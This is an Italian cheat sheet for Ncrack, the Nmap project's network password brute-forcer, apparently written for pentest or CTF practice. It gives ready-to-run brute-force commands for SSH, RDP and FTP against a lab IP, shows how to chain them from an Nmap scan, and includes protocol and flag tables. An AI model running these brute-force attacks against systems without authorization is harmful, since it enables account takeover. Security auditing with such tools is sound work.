# Ncrack — Network Authentication Cracker

**Ncrack** è un network authentication cracker del progetto Nmap. Progettato per bruteforce ad alta velocità su protocolli di rete.

---

## A cosa serve?

- **Bruteforce credenziali** su servizi di rete (SSH, RDP, FTP, HTTP, SMB, ecc.)
- **Audit di sicurezza** — verifica la robustezza delle password su servizi esposti
- **Nmap integration** — può leggere output Nmap per attaccare automaticamente i servizi trovati

---

## Come usarlo

### Bruteforce SSH

```bash
ncrack -u admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://10.10.11.42
```

### Bruteforce RDP

```bash
ncrack -u administrator -P passwords.txt rdp://10.10.11.42
```

### Bruteforce FTP

```bash
ncrack -u admin -P passwords.txt ftp://10.10.11.42
```

### Bruteforce multipli servizi

```bash
ncrack -u admin -P passwords.txt ssh://10.10.11.42 ftp://10.10.11.42 rdp://10.10.11.42
```

### Da output Nmap

```bash
nmap -sV -oX scan.xml 10.10.11.42
ncrack -iX scan.xml -u admin -P passwords.txt
```

### Con lista utenti

```bash
ncrack -U users.txt -P passwords.txt ssh://10.10.11.42
```

---

## Protocolli supportati

| Protocollo | Porta default | Sintassi |
|------------|---------------|----------|
| SSH | 22 | `ssh://host` |
| RDP | 3389 | `rdp://host` |
| FTP | 21 | `ftp://host` |
| Telnet | 23 | `telnet://host` |
| HTTP(S) | 80/443 | `http://host` |
| POP3(S) | 110/995 | `pop3://host` |
| IMAP | 143 | `imap://host` |
| SMB | 445 | `smb://host` |
| VNC | 5900 | `vnc://host` |
| MySQL | 3306 | `mysql://host` |
| MSSQL | 1433 | `mssql://host` |
| PostgreSQL | 5432 | `psql://host` |
| MongoDB | 27017 | `mongodb://host` |

---

## Opzioni utili

| Flag | Descrizione |
|------|-------------|
| `-u user` | Username singolo |
| `-U users.txt` | File con lista utenti |
| `-P passwords.txt` | Wordlist password |
| `-p 2222` | Porta custom |
| `-iX scan.xml` | Input da Nmap XML |
| `-oN output.txt` | Output in formato normale |
| `-T 4` | Timing (0-5, come nmap) |
| `-g CL=1` | Connessioni parallele per host |
| `-f` | Fermati al primo successo |
| `-v` | Verbose |

---

## Differenze con Hydra

| | ncrack | hydra |
|---|---|---|
| Progetto | Nmap | THC |
| Input Nmap | Sì (nativo) | No |
| Protocolli | ~15 | ~50 |
| Timing | Stile Nmap (T0-T5) | Thread manuali |
| Velocità | Molto veloce | Veloce |

> Fonte: https://github.com/nmap/ncrack
